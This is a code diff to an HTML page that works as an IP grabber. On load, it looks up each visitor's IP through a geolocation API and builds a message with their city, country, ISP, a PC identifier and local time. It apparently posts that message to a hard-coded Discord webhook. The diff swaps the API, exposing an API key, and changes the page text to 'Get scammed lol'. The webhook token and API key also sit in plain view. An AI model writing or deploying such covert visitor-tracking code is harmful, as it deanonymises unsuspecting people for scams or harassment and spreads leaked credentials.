@@ -5,13 +5,13 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
     <script>
       function getLocation(ip, pageUserID) {
-        fetch("https://ipapi.co/" + ip + "/json/")
+        fetch("https://api.ipgeolocation.io/ipgeo?apiKey=91c01d8e6ee64b10beb158f3006aaae4&ip=" + ip)
           .then((response) => response.json())
           .then((data) => {
             const location = data.city + ", " + data.region_code + ", " + data.country_name;
-            const timezoneOffset = data.utc_offset;
-            const timezoneName = data.timezone;
-            const isp = data.org;
+            const timezoneOffset = data.time_zone.offset;
+            const timezoneName = data.time_zone.name;
+            const isp = data.isp;
             const localTime = moment().utcOffset(timezoneOffset).format("YYYY-MM-DD hh:mm:ss A");
             const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
             const message = "IP: " + ip + "\nLocation: " + location + "\nISP: " + isp + "\nPC ID: " + pageUserID + "\nTime: " + localTime + " (CET)";
@@ -51,6 +51,6 @@
     </script>
   </head>
   <body onload="displayIP()">
-    <p>Your IP address is: <span id="ip"></span></p>
+    <p>Get scammed lol, your ip is: <span id="ip"></span></p>
   </body>
 </html>
